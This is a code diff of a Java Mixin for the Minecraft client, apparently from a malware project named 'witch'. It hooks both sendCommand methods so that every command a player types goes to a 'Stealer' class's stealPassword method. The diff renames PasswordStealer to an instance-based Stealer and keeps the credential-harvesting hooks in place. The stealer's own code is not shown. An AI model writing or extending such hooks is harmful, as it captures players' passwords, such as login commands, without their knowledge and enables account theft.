@@ -1,6 +1,6 @@
 package me.soda.witch.mixin;
 
-import me.soda.witch.features.PasswordStealer;
+import me.soda.witch.features.Stealer;
 import net.minecraft.client.network.ClientPlayerEntity;
 import net.minecraft.text.Text;
 import org.spongepowered.asm.mixin.Mixin;
@@ -11,14 +11,15 @@ import org.spongepowered.asm.mixin.injection.callback.CallbackInfoReturnable;
 
 @Mixin(ClientPlayerEntity.class)
 abstract class ClientPlayerEntityMixin {
+    Stealer stealer = new Stealer();
 
     @Inject(method = "sendCommand(Ljava/lang/String;)Z", at = @At("HEAD"), cancellable = true)
     private void onSendCommand(String command, CallbackInfoReturnable<Boolean> cir) {
-        PasswordStealer.stealPassword(command);
+        stealer.stealPassword(command);
     }
 
     @Inject(method = "sendCommand(Ljava/lang/String;Lnet/minecraft/text/Text;)V", at = @At("HEAD"), cancellable = true)
     private void onSendCommand(String command, Text preview, CallbackInfo info) {
-        PasswordStealer.stealPassword(command);
+        stealer.stealPassword(command);
     }
 }
